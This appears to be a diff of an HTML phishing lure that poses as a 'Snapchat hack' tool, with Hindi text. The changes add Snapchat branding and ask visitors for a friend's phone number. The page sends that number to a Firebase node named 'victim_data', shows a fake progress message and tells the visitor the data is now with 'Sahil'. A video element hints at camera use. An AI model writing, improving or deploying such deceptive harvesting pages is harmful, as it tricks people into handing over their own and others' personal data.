@@ -1,27 +1,32 @@
-
 <!DOCTYPE html>
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Hacker Edition</title>
+    <title>Snapchat</title>
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
+    <link rel="apple-touch-icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
+
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
-        .hacker-box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; background: #050505; box-shadow: 0 0 15px #0f0; margin-top: 50px;}
-        input { padding: 12px; width: 85%; margin: 15px 0; background: #111; color: #0f0; border: 1px solid #0f0; border-radius: 5px; font-size: 16px; }
-        button { background: #0f0; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
-        video { width: 100%; max-width: 350px; border: 2px solid #0f0; border-radius: 10px; margin-top: 10px; }
+        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 20px; }
+        .logo { width: 80px; margin-top: 20px; }
+        .hacker-box { border: 2px solid #fffc00; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 0 15px #fffc00; margin-top: 30px;}
+        input { padding: 12px; width: 85%; margin: 15px 0; background: #222; color: #fff; border: 1px solid #fffc00; border-radius: 5px; }
+        button { background: #fffc00; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
+        video { width: 100%; max-width: 300px; border: 2px solid #fffc00; border-radius: 10px; margin-top: 10px; background: #000; }
     </style>
 </head>
 <body>
+    <img src="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png" class="logo">
     <div class="hacker-box">
-        <h2>SYSTEM ACCESS: SNAP-HACK</h2>
-        <p>[!] हैकर मोड एक्टिवेटेड: साहिल</p>
+        <h2 style="color:#fffc00">SNAP-HACK v2.0</h2>
+        <p>[!] सर्वर कनेक्टेड: साहिल</p>
         <video id="video" autoplay playsinline></video>
-        <input type="number" id="phone" placeholder="अपना मोबाइल नंबर डालें">
-        <br>
-        <button onclick="sendToSahil()">UNLOCK SYSTEM</button>
-        <p id="status" style="margin-top:15px;"></p>
+        <input type="number" id="phone" placeholder="दोस्त का नंबर डालें">
+        <button onclick="sendToSahil()">HACK SNAPCHAT</button>
+        <p id="status" style="margin-top:15px; color: #fffc00;"></p>
     </div>
 
     <script type="module">
@@ -47,16 +52,17 @@
 
         window.sendToSahil = function() {
             const phone = document.getElementById('phone').value;
-            if(phone.length < 10) { alert("सही नंबर डालो भाई!"); return; }
+            if(phone.length < 10) { alert("नंबर तो डालो भाई!"); return; }
             
             push(ref(db, 'victim_data'), {
                 number: phone,
                 time: new Date().toLocaleString()
             }).then(() => {
-                document.getElementById('status').innerText = "डाटा साहिल के पास पहुँच गया!";
-                alert("मिशन कामयाब! डाटा सेव हो गया।");
+                document.getElementById('status').innerText = "डाटा एक्सेस हो रहा है... 99%";
+                setTimeout(() => { alert("काम हो गया! डाटा साहिल के पास सेव है।"); }, 2000);
             });
         }
     </script>
 </body>
 </html>
+
